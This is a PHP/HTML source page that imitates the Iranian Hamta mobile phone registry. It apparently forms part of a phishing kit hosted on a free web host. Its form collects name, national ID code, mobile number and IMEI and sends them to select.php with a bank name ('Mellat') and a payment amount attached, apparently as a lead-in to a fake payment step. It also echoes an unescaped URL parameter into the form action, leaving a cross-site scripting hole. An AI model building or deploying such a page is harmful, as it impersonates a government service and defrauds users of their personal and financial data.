
<?php
$e=intval($_GET["e"]);
if(isset($_GET["P"])){
	$P=$_GET["P"];
}else{
	$P="Mellat";
}
?>


<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta itemprop="name" content="hamta"/>
    <meta itemprop="headline" content="سامانه همتا"/>
    <meta itemprop="description" content="رجیستری تلفن همراه"/>
    <meta itemprop="image" content="https://hamta.ntsw.ir/favicon.ico"/>
    <meta itemprop="author" content="همتا"/>
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="favicon.ico">
    <title>رجیستری تلفن همراه - همتا</title>
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link href="css/dashboard.css" rel="stylesheet">
    <link href="css/enjoyhint.css" rel="stylesheet">
    <link href="plugins/font-awsome/font-awesome.min.css" rel="stylesheet">
    <link href="css/sweetalert.css" rel="stylesheet">
	<style>img[alt="www.000webhost.com"]{display:none;}</style>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
</head>

<body class="rtl" style="">
    <nav class="navbar navbar-dark navbar-expand-md fixed-top pr-0"> <a class="navbar-brand navbar-brand col-5 col-sm-3 col-md-3 col-lg-3 col-xl-3 mr-0 align-content-center text-center pt-3" href="index.html?amount=20,000">سامانه همتا</a> <button class="navbar-toggler d-lg-none collapsed" type="button" data-toggle="collapse" data-target="#navbarsExampleDefault"
            aria-controls="navbarsExampleDefault" aria-expanded="false" aria-label="Toggle navigation"> <span class="navbar-toggler-icon"></span> </button>
        <div class="navbar-collapse ltr collapse" id="navbarsExampleDefault" style="">
            <ul class="navbar-nav rtl">
                <li class="nav-item notify" style="display:none"><a class="nav-link" href="#"><span class="badge badge-danger notifyBadge">0</span> پیام های همتا </a></li>
                <li class="nav-item"><a href="../../../https@hamtainfo.ntsw.ir/_25d8_25a2_25d9_2585_25d9_2588_25d8_25b2_25d8_25b4-_25d9_2587_25d8_25a7/_25d8_25a2_25d9_2585_25d9_2588_25d8_25b2_25d8_25b4-_25d9_2581_25d8_25b9_25d8_25a7_25d9_2584-_25d8_25_0f080c3731" class="nav-link">آموزش و اطلاع رسانی</a></li>
                <li class="nav-item"><a class="nav-link" href="#">تماس با ما</a></li>
                <li class="nav-item"><a class="nav-link" href="#">درباره ما</a></li>
                <li class="nav-item"><a class="Description nav-link">راهنما <i class="fa fa-info-circle"></i></a></li>
            </ul>
        </div>
    </nav>
    <div class="container-fluid">
        <div class="row">
            <main id="main" class="row row-eq-height text-center placeholders p-0 m-0">
                <div class="loginrightdiv login_area pt-5">
                    <div class="loginbox col-12 col-xl-6 col-lg-9 col-md-9 col-sm-12 m-auto text-center p-0">
                        <div id="renderForm">
                            <div class="login_title">رجیستری تلفن همراه</div>
<script>
$(document).on( 'keydown' , '.numeric' ,function (e) {
    if ($.inArray(e.keyCode, [46, 8, 9, 27, 13, 110, 190]) !== -1 ||
        (e.keyCode == 65 && e.ctrlKey === true) || 
        (e.keyCode >= 35 && e.keyCode <= 40)) {
             return;
    }
    if ((e.shiftKey || (e.keyCode < 48 || e.keyCode > 57)) && (e.keyCode < 96 || e.keyCode > 105)) {
        e.preventDefault();
    }
});        
     
$(document).on( 'keydown' , '.farsi' ,function (e) {
    console.log(e.key);
        if(e.key == 'Alt' || e.key == 'Shift' || e.key == 'Tab' || e.key == 'Backspace')
        return ;
         
        if( !e.key.match(/^[ا آ ئ ب پ ت ث ج چ ح خ د ذ ر ز ژ س ش ص ض ط ظ ع غ ف ق ک گ ل م ن و ه ی]+$/)){
            e.preventDefault();
        }
});        
     
     
$(document).on( 'keydown' , '.engelish' ,function (e) {
    console.log(e.key);
        if(e.key == 'Alt' || e.key == 'Shift' || e.key == 'Tab' )
        return ;
         
        if( !e.key.match(/^[0-9 a-z A-Z]+$/)){
            e.preventDefault();
        }
});
</script>
                            
                            <div class="card-block">
                                <form action="select.php?P=<?php echo $P?>/?e=<?php echo $e?>" method="post" novalidate="novalidate"><input name="__RequestVerificationToken" type="hidden" value="BpzrOdrwGBm6PizUhYutRATsbmh2Kwia3Ry4waE6pl4QSD5FMxs-Kyh6Sc9fSrPlkTdWyYqhMTmsaNLOLT9nzn13nPPzdmXkPpfVToAOsLw1">
                                    <div class="row col-12 m-auto p-0 pb-sm-3 text-center align-content-center"><span class="col-12 col-sm-12 col-md-7 desclogin mt-4 pr-0 float-right">لطفا مشخصات خود را وارد نمایید.</span></div>
                                    <div class="row col-12 m-auto pt-1 pb-sm-3 text-center align-content-center">
									
									<span class="text-box container-fluid m-auto"> 
										<input class="form-control mt-3 rtr farsi" data-val="true" data-val-required="پر کردن این قسمت الزامی میباشد" id="name" onkeypress="keyenter(this,event)"  name="name" type="text" placeholder="نام و نام خانوادگی " maxlength="13">
										<span class="field-validation-valid bottom col-md-12" data-valmsg-for="name" data-valmsg-replace="true"></span>
										<small class="text-right">نام را فقط به فارسی بنویسید</small>
									</span>
									
									<span class="text-box container-fluid m-auto"> 
										<input class="form-control mt-3 ltr numeric" data-val="true" data-val-required="پر کردن این قسمت الزامی میباشد" id="sid" name="sid" type="text" placeholder="کد ملی " maxlength="10">
										<span class="field-validation-valid bottom col-md-12" data-valmsg-for="sid" data-valmsg-replace="true"></span>
									</span>
									
									<span class="text-box container-fluid m-auto"> 
										<input class="form-control mt-3 ltr numeric" data-val="true" data-val-required="پر کردن این قسمت الزامی میباشد" id="mobn" name="mobn" type="text" placeholder="شماره تلفن همراه " maxlength="11">
										<span class="field-validation-valid bottom col-md-12" data-valmsg-for="mobn" data-valmsg-replace="true"></span>
									</span>
									
									<span class="text-box container-fluid m-auto"> 
										<input class="form-control mt-3 ltr numeric" data-val="true" data-val-required="پر کردن این قسمت الزامی میباشد" id="imei" name="imei" type="text" placeholder="سریال IMEI تلفن همراه - 15 رقمی" maxlength="15">
										<span class="field-validation-valid bottom col-md-12" data-valmsg-for="imei" data-valmsg-replace="true"></span>
									</span>
									
                                        <div class="clearfix"></div>
                                        <div class="loader container-fluid m-auto" style="display:none">
                                            <div class="cssload-spin-box"></div>
                                        </div><span class="button-box container-fluid m-auto"> <input type="submit" value="ادامه" class="btn btn-primary mt-4 login_btn col-12 col-sm-12 col-md-4 mcode_login step3"> </span>
                                        <div class="reg_box col-12 mt-5 p-0">
                                            <div class="login_title">توجه</div><br/><span class="col-12 col-sm-12 col-md-12 desclogin mt-12 pr-0 float-right text-right">درصورتی که تلفن همراه دو سیم کارت ( و یا بیشتر ) است ، IMEI سیمکارت اول را وارد کنید.</span> </div>

                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                    <div class="col-12 col-xl-6 col-lg-9 col-md-9 col-sm-12 m-auto text-center p-0" style="opacity:0;">
                        <div class="btn_n_l col-12 p-0"><button class="btn btn-primary mt-4 col-12 col-sm-12 col-md-4 float-right register-btn imeiInquiry new_btn" type="button"></button> <button class="btn btn-primary mt-4 col-12 col-sm-12 col-md-4 float-left register-btn new_btn2"
                                type="button" onclick="location.href=index.php"></button></div>
                    </div>
                    <div class="clearfix"></div>
                    <div class="col-12 col-xl-6 col-lg-9 col-md-9 col-sm-12 m-auto text-center">
                        <div class="col-12 col-sm-12 col-md-12 mt-4 text-center" style="font-size:17px;color:#035eff"></div>
                        <div class="col-lg-12 col-md-12 col-sm-12 mt-4 pb-4 text-center" style="display:inline-block">
                        </div>
                    </div>
                    <div class="clearfix"></div>
                    <div class="welcome_box col-12 m-auto p-3 pb-5 text-center p-0">
                        <h2 class="pb-5"></h2>
                    </div>
                    <div class="col-12 p-0">
                        <p class="login_footer p-lg-3" style="text-align:justify">طرح ثبت تجهیزات دارای سیم کارت با مشارکت وزارت صنعت، معدن و تجارت، وزارت ارتباطات و فناوری اطلاعات و اپراتورهای تلفن همراه، ستاد مرکزی مبارزه با قاچاق کالا و ارز و گمرک ج.ا.ا به اجرا گذاشته می&zwnj;شود. هدف از اجرای این طرح، مبارزه
                            سیستمی با عرضه و فعالیت تلفن&zwnj;های همراه (و سایر تجهیزات دارای سیمکارت) قاچاق و تقلبی میباشد. هر تلفن همراه دارای یک شناسه 15 رقمی منحصربه&zwnj;فرد (IMEI) است که با استفاده از آن می&zwnj;توان هر تلفن همراه را در شبکه مخابراتی
                            ردیابی کرد. ردیابی بر مبنای IMEI با نواقصی همراه است که به این منظور، از ترکیب این شناسه و یک کد منحصر به&zwnj;فرد دیگر برای تشکیل یک زوج یکتا، بهره گرفته می&zwnj;شود.</p>
                    </div>
                    <div class="clearfix"></div>
                </div>
                <div class="loginleftdiv col-12 col-xl-5 col-md-12 col-sm-12 m-0 p-0 pull-left align-middle">
                    <div class="loginbg">
                        <h1 class="mt-3 mb-1 text-center hamta_logo"></h1>
                        <p class="col-12 m-auto"></p>
                        <div class="clearfix"></div>
                    </div>
                </div>
            </main>
        </div>
    </div>
    <script defer="">
        function rehelpfunction(){$(".enjoyhint_skip_btn").trigger("click")}function OnImeiSuccess(n){n.hasOwnProperty("status")&&(n.status?swal({title:"تکمیل فرایند",html:n.message,type:"success"}):n.code===601?swal({title:"",text:n.message,type:"warning",timer:2e4}).then(function(){$(".captcha-image").attr("src","/Account/CaptchaImage?t="+(new Date).getTime())},function(n){n==="timer"&&location.reload()}):swal({title:"",text:n.message,type:"error",timer:2e4}).then(function(){$(".captcha-image").attr("src","/Account/CaptchaImage?t="+(new Date).getTime())},function(n){n==="timer"&&location.reload()}))}$(window).on("resize",rehelpfunction);$(document).ready(function(){!1&&swal({title:"",html:"",type:""});$(window).resize(function(){var n=$(this).width();n<576?$("#sidebarCollapse").hasClass("active")||$("#sidebarCollapse").click():$("#sidebarCollapse").hasClass("active")&&$("#sidebarCollapse").click()});$(document).ajaxStart(function(){$("input[type=submit]").prop("disabled",!0)});$(document).ajaxStop(function(){function n(){$(".MDescription").on("click",function(){var n=new EnjoyHint({});n.set([{"next .Mstep1":"با شماره گیری *#06#  میتوانید شناسه دستگاه(IMEI) آن را مشاهده نمایید. لطفا این شناسه را وارد نمایید.",nextButton:{className:"myNext",text:"خروج"},showSkip:!1},]);n.run()})}$("input[type=submit]").prop("disabled",!1);$(document).ready(n);$(window).on("resize",n)})});$(document).ready(function(){$(".imeiInquiry").on("click",function(){var n=$.get("").done(function(n){swal({title:'<div class="modal-header"><h4 class="modal-title">استعلام اصالت دستگاه<\/h4><\/div>',html:n,showCancelButton:!0,confirmButtonText:"جستجو",cancelButtonText:"لغو",preConfirm:function(){return new Promise(function(n,t){var i=$(".modal-body form"),f=i.validate(),r,u;i.valid()||(r="",$.each(f.errorList,function(n,t){r+=t.message+".\n"}),t(r));u={imeiNumber:$("#ImeiNumber").val(),captcha:$(".inquiryCaptcha").val(),token:$('input[name="__RequestVerificationToken"]',i).val()};n(u)})},onOpen:function(){$.validator.unobtrusive.parse($(".modal-body form"));$("a.refresh-captcha").on("click",function(n){n.preventDefault();$(".captcha-image").attr("src","/Account/CaptchaImage?t="+(new Date).getTime())});$("#ImeiNumber").mask("000000000000000",{placeholder:"شناسه دستگاه (IMEI) خود را وارد نمایید "});$(".Description").popover()},onClose:function(){$(".Description").popover("hide")}}).then(function(n){$.ajax({url:"",type:"POST",data:{__RequestVerificationToken:n.token,ImeiNumber:n.imeiNumber,CaptchaInputText:n.captcha},beforeSend:function(){$("input[type=button]").prop("disabled",!0);$("body").css("background-color","black");$("body").css({opacity:.8});$("#ajloader").show()},success:function(n){$("input[type=button]").prop("disabled",!1);$("body").css("opacity","1");$("#ajloader").hide();$("body").css("background-color","");OnImeiSuccess(n)},fail:function(n){$("input[type=button]").prop("disabled",!1);$("body").css("opacity","1");$("#ajloader").hide();$("body").css("background-color","");OnFailure(n)}})}).catch(swal.noop)}).fail(function(n){OnFailure(n)})})})
    </script>
    <script>
        function helpfunction(){$(".Description").on("click",function(){var n=new EnjoyHint({});n.set([{"":"برای انجام مراحل ثبت نام روی دکمه ی ثبت نام کلیک کنید.",nextButton:{className:"myNext",text:"بعدی"},skipButton:{className:"mySkip",text:"خروج"}},{"":"شماره تلفن همراه را وارد کرده و سپس بر روی گزینه ادامه کلیک کنید.",nextButton:{className:"myNext",text:"بعدی"},skipButton:{className:"mySkip",text:"خروج"}},{"":"از طرف سامانه، پیامکی تحت عنوان «رمز عبور موقت» که حاوی 5 رقم می&zwnj;باشد ارسال می&zwnj;گردد.",nextButton:{className:"myNext",text:"خروج"},showSkip:!1}]);n.run()})}function OnSuccess(n){n.hasOwnProperty("status")?n.status?swal({title:"تکمیل فرایند",text:n.message,type:"success",onClose:function(){$("input:not([type=submit]):not([type=hidden])").val("")}}):n.hasOwnProperty("reload")?swal({title:"خطا!",text:n.message,confirmButtonText:"تایید",type:"error"}).then(function(){location.reload()}):swal({title:"خطا!",text:n.message,confirmButtonText:"تایید",type:"error"}):n.hasOwnProperty("redirectUrl")?(window.location=n.redirectUrl,$("input[type=button]").prop("disabled",!0),$("body").css("background-color","black"),$("body").css({opacity:.8}),$("#ajloader").show()):n.hasOwnProperty("reload")?location.reload():($("#renderForm").empty(),$("#renderForm").html(n),$(".countdown").length&&typeof timer!="undefined"&&timer.reset())}function OnFailure(){swal("خطا!","برقراری ارتباط مقدور نمی باشد!","error")}$(document).ready(helpfunction);$(window).on("resize",helpfunction);$(window).load(function(){$("#PreUserName").mask("0000-000-0000",{placeholder:"شماره تلفن همراه خود را وارد نمایید "});$("#nationalCodeChk").click(function(){$("#PreUserName").mask("000-000000-0",{placeholder:"شماره ملی خود را وارد نمایید"})});$("#msisdnChk").click(function(){$("#PreUserName").mask("0000-000-0000",{placeholder:"شماره تلفن همراه خود را وارد نمایید "})});$(".reg_btn").click(function(n){n.preventDefault();var t=$('input[name="__RequestVerificationToken"]',main).val();$.ajax({type:"GET",url:"",data:{__RequestVerificationToken:t},success:function(n){$("#renderForm").empty();$("#renderForm").html(n)},error:function(){swal("خطا!","برقراری ارتباط مقدور نمی باشد!","error")}})});$(document).ajaxStart(function(){$("input[type=submit]").prop("disabled",!0);$(".loader").css("display","block")});$(document).ajaxStop(function(){$("input[type=submit]").prop("disabled",!1);$(".loader").css("display","none")});$(document).ajaxComplete(function(){$(".input-icon").on({mouseenter:function(){$("#Password").attr("type","text")},mouseleave:function(){$("#Password").attr("type","password")}});$(".captcha-image").attr("src","/Account/CaptchaImage?t="+(new Date).getTime());$("#MsisdnNumber").mask("0000-000-0000",{placeholder:"شماره تلفن همراه خود را وارد نمایید "})})})
    </script>
    <div id="ajloader">
        <div align="center" class="cssload-fond pt-5">
            <div class="cssload-container-general">
                <div class="cssload-internal">
                    <div class="cssload-ballcolor cssload-ball_1"></div>
                </div>
                <div class="cssload-internal">
                    <div class="cssload-ballcolor cssload-ball_2"></div>
                </div>
                <div class="cssload-internal">
                    <div class="cssload-ballcolor cssload-ball_3"></div>
                </div>
                <div class="cssload-internal">
                    <div class="cssload-ballcolor cssload-ball_4"></div>
                </div>
            </div>
        </div>
    </div>
</body>
</html>